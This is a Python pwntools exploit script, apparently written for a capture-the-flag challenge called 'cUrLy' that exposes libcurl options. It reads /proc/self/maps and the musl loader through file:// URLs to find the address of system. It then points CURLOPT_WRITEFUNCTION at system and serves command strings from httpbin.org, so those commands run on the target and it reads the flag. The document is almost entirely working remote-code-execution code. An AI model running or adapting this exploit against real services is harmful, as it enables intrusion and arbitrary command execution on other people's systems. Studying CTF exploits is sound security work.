from pwn import *

CURLOPT_URL = 10002
CURLOPT_WRITEFUNCTION = 20011

if sys.argv[1:]:
    r = process(sys.argv[1:])
else:
    r = remote("127.0.0.1", 1024)

def setopt(opt, val):
    r.recvuntil(b"<------------------------------>\n")
    is_str = isinstance(val, str)
    r.sendline(b"1" if is_str else b"0")
    r.recvuntil(b"option? ")
    r.sendline(str(opt).encode())
    if is_str:
        r.recvuntil(b"string value? ")
        r.sendline(val.encode())
    else:
        r.recvuntil(b"value? ")
        r.sendline(str(val).encode())
    res = r.recvuntil(b" <----------- cUrLy ------------>", drop=True)
    if b"curl_easy_setopt() failed:" in res:
        print(f"{res = }")
    return res

def perform(quiet=False):
    r.recvuntil(b"<------------------------------>\n")
    r.sendline(b"2")
    res = r.recvuntil(b" <----------- cUrLy ------------>", drop=True)
    if b"curl_easy_perform() failed:" in res and not quiet:
        print(f"{res = }")
    return res

# cant read /flag, try RCE instead
setopt(CURLOPT_URL, "file:///flag")
perform()

setopt(CURLOPT_URL, "file:///proc/self/maps")
maps = perform().decode().strip()

ld_start = next(x for x in maps.splitlines() if "/lib/ld-musl-x86_64.so.1" in x)
log.info(ld_start)
ld_start = int(ld_start.split("-")[0], 16)
log.success(f"{ld_start = :#x}")

with open("ld-musl-x86_64.so.1", "wb") as f:
    setopt(CURLOPT_URL, "file:///lib/ld-musl-x86_64.so.1")
    f.write(perform())

e = ELF("ld-musl-x86_64.so.1")
system = ld_start + e.symbols["system"]
log.success(f"{system = :#x}")

# setopt(CURLOPT_URL, "file:////usr/local/bin/curly")
# with open("curly", "wb") as f:
#     r.recvuntil(b"<------------------------------>\n")
#     r.sendline(b"2")
#     data = r.recvuntil(b" <----------- cUrLy ------------>")
#     data += r.recvuntil(b" <----------- cUrLy ------------>", drop=True)
#     f.write(data)

def run(cmd):
    setopt(CURLOPT_WRITEFUNCTION, system)
    setopt(CURLOPT_URL, "https://httpbin.org/base64/" + b64e(cmd.encode() + b"\0"))
    log.info(f"system({cmd!r})")
    res = perform(quiet=True).decode()
    res = res.replace("curl_easy_perform() failed: Failed writing received data to disk/application", "")
    res = res.strip()
    print(res)


run("id")
run("ls -l /flag /usr/local/bin/getflag")
run("/flag")

r.sendline(b"-1") # exit
